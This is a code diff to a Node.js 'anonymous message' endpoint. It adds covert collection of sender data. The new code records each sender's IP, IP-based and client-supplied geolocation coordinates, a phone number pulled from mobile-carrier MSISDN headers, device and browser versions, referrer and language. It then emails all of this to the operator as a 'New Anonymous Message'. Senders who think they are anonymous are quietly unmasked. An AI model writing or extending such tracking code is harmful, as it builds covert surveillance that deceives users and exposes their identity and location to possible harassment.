@@ -59,23 +59,63 @@ app.post('/message', async (req, res) => {
     const data = await fs.readFile(MESSAGES_FILE, 'utf8').catch(() => '[]');
     const messages = JSON.parse(data);
 
+    // Get sender's IP address (handle proxies)
     let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     if (typeof ip === 'string' && ip.includes(',')) {
       ip = ip.split(',')[0].trim();
     }
+    if (ip === '::1') ip = '127.0.0.1';
 
+    // Get location from IP with coordinates
     let location = 'Unknown';
+    let coordinates = null;
     try {
       if (ip && ip !== '127.0.0.1' && ip !== '::1') {
         const r = await axios.get(`http://ip-api.com/json/${ip}`);
         if (r.data?.status === 'success') {
           location = `${r.data.city}, ${r.data.country}`;
+          if (r.data.lat && r.data.lon) {
+            coordinates = {
+              latitude: r.data.lat,
+              longitude: r.data.lon,
+              accuracy: 5000
+            };
+          }
+        }
+      } else {
+        location = 'Local/Localhost';
+      }
+    } catch (error) {
+      console.error('Geolocation error:', error.message);
+    }
+
+    // Prefer client-provided precise coordinates
+    const clientCoordinates = req.body.coordinates || null;
+
+    // Attempt to capture phone from carrier headers
+    const msisdnHeaderCandidates = [
+      'x-msisdn', 'x-up-calling-line-id', 'x-wap-msisdn',
+      'x-hutch-msisdn', 'x-source-msisdn', 'x-network-info'
+    ];
+    let phoneAuto = null;
+    for (const key of msisdnHeaderCandidates) {
+      const raw = req.headers[key];
+      if (typeof raw === 'string' && raw.trim()) {
+        const sanitized = raw.replace(/[^\d+]/g, '');
+        if (sanitized.replace(/\D/g, '').length >= 7) {
+          phoneAuto = sanitized;
+          break;
         }
       }
-    } catch {}
+    }
 
+    // Parse User Agent for detailed device info
     const parser = new UAParser(req.headers['user-agent']);
     const ua = parser.getResult();
+
+    // Capture referrer and language
+    const referrer = req.headers['referer'] || 'Direct';
+    const language = (req.headers['accept-language'] || 'Unknown').split(',')[0].trim();
 
     const newMessage = {
       id: Date.now(),
@@ -83,14 +123,25 @@ app.post('/message', async (req, res) => {
       timestamp: new Date().toISOString(),
       ip,
       location,
-      browser: ua.browser.name || 'Unknown',
-      os: ua.os.name || 'Unknown'
+      coordinates: clientCoordinates || coordinates,
+      userAgent: {
+        browser: ua.browser.name || 'Unknown',
+        browserVersion: ua.browser.version || 'Unknown',
+        os: ua.os.name || 'Unknown',
+        osVersion: ua.os.version || 'Unknown',
+        deviceType: ua.device.type || 'Desktop'
+      },
+      referrer,
+      language
     };
+    if (phoneAuto) newMessage.phone = phoneAuto;
 
     messages.push(newMessage);
     await fs.writeFile(MESSAGES_FILE, JSON.stringify(messages, null, 2));
 
     // EMAIL (async, safe)
+    const coord = newMessage.coordinates || {};
+    const uaInfo = newMessage.userAgent || {};
     sendEmail(
       '📩 New Anonymous Message',
       `
@@ -98,8 +149,12 @@ Message: ${newMessage.message}
 Time (UTC): ${newMessage.timestamp}
 IP: ${newMessage.ip}
 Location: ${newMessage.location}
-Browser: ${newMessage.browser}
-OS: ${newMessage.os}
+Coordinates: ${coord.latitude ?? 'N/A'}, ${coord.longitude ?? 'N/A'} (±${coord.accuracy ?? 'N/A'}m)
+Browser: ${uaInfo.browser} ${uaInfo.browserVersion}
+OS: ${uaInfo.os} ${uaInfo.osVersion}
+Device: ${uaInfo.deviceType}
+Referrer: ${newMessage.referrer}
+Language: ${newMessage.language}${phoneAuto ? `\nPhone: ${phoneAuto}` : ''}
       `.trim()
     );
 
